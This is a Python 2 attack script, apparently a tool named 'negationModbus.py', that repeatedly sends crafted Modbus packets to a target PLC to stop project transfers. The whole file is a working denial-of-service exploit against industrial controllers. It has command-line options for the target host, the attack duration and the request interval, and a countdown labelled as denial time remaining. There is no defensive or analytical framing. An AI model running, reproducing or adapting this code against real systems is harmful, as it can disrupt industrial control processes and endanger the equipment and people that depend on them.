# -*- coding: utf-8 -*-
import time
import socket
import random
import argparse
import subprocess as sp
 
# Clear the screen for faux non scroll
def cls():
    tmp = sp.call('clear', shell = True)
 
parser = argparse.ArgumentParser(prog='negationModbus.py',
                                description=' [+] Stop project transfer from PLC (via Modbus Injection).',
                                epilog='[+] Demo: negationModbus.py --host <target> --port 502 --min 50  --sec 40',
                                version="1.0")
 
parser.add_argument('--sid',  dest="SlaveID", help='Slave ID (default 00)', default="00")
parser.add_argument('--host', dest="HOST",    help='Host',required=True)
parser.add_argument('--port', dest="PORT",    help='Port (default 502)',type=int,default=502)
 
parser.add_argument('--hrs',  dest="HRS",     help='For how many *HOURS* do you want to run the attack?',   default="0", type=int)
parser.add_argument('--mins', dest="MINS",    help='For how many *MINUTES* do you want to run the attack?', default="1",type=int)
parser.add_argument('--secs', dest="SECS",    help='For how many *SECONDS* do you want to run the attack?', default="0",type=int)
 
# extra argument so we can choose the request frequency
parser.add_argument('--interval', dest="INTERVAL",    help='How many seconds to wait between requests', default="4",type=int)
 
args        =   parser.parse_args()
 
HST         =   args.HOST
SID         =   str(args.SlaveID) ### ---> 00 to ff !!!!
portModbus  =   args.PORT
 
# Convert hours & mins to seconds... keep seconds as seconds
_hours = (args.HRS * 60) * 60
_mins  = args.MINS * 60
_secs  = args.SECS
 
# Add all seconds to get total denial time
_total_seconds = _hours + _mins + _secs
 
# ok... parse the interval argument here:
_interval = args.INTERVAL
 
if _total_seconds == 0:
    print("At least one (pointless?) second must be specified.")
    exit()
 
if _interval == 0:
    print("The interval is too short! Must be 1 or more.")
    exit()
 
 
class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'
 
 
def rand_color(bit):
     
    color_array = [Colors.BLUE, Colors.GREEN, Colors.RED, Colors.WHITE]
    rcolor = random.randint(0,3)
 
    return color_array[rcolor] + bit + Colors.ORANGE


def create_header_modbus(length,unit_id):
    trans_id = "4462"#hex(random.randrange(0000,65535))[2:].zfill(4)  -> dejo transaccion fija
    proto_id = "0000"
    protoLen = length.zfill(4)
    unit_id = unit_id
 
    return trans_id + proto_id + protoLen + unit_id.zfill(2)
 
def busyService(pduInjection, randBits):
 
    _result = ""
 
    reqst = {}
    lenPdu = str((len(pduInjection)/2)+1)
     
    reqst[0] =  create_header_modbus(lenPdu,SID)
    reqst[1] =  pduInjection
 
    MB_Request =    reqst[0] # header
    MB_Request +=   reqst[1] # pdu
 
    try:
        # podremos conectarnos ?
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(95)
        client.connect((HST,portModbus))
    except Exception, e:
        print " [!] No Conecta: "
        print e    
 
    # change color of random bit
    rand_bit = rand_color(reqst[1][10:-2])
 
    mb_stopConection = MB_Request.decode('hex')
    _result += Colors.GREEN+" [+] Sent: \t\t"+Colors.BLUE+reqst[0]+Colors.ORANGE+reqst[1][:-4]+Colors.DEFAULT+rand_bit+"00"+Colors.DEFAULT+"\n"
    client.send(mb_stopConection)
     
    try:
        # tendremos respuesta ?
        modResponse = (client.recv(1024))  
        _result += " [+] Response: \t\t" + modResponse.encode("hex") + "\n"
        _result += " [+] Response(dec): \t"+modResponse+"\n"
        return _result
 
    except Exception, e:
 
        return " [!] No Response: \t"+Colors.RED+str(e)+Colors.DEFAULT+"\n"
     
    client.close()
 
def get_remaining_hms(total_seconds):
    # beautifully simple time conversion.
    m, s = divmod(total_seconds, 60)
    h, m = divmod(m, 60)
    hms = "%d:%02d:%02d" % (h, m, s)
    return hms
 
 
def deny(total_seconds, interval):
     
    result = ""
 
    while total_seconds != 0:
 
        cls()
 
        remaining_time = get_remaining_hms(total_seconds)
 
        print " [+] Denial Time Remaining (approx):\t[ " + str(remaining_time)+" ]\n"
        print "\n"
        print result
 
 
        time.sleep(1)
 
        total_seconds -= 1
 
        # Check to see if remaining time and interval mod to 0, if so, send request!
        if total_seconds % interval == 0:
            result = ""
            secuenceRnd = (hex(random.randrange(00,255))[2:]).zfill(2)
            badInjection = "5a01340001"+str(secuenceRnd)+"00"
            result += busyService(badInjection, secuenceRnd)
         
 
deny(_total_seconds, _interval)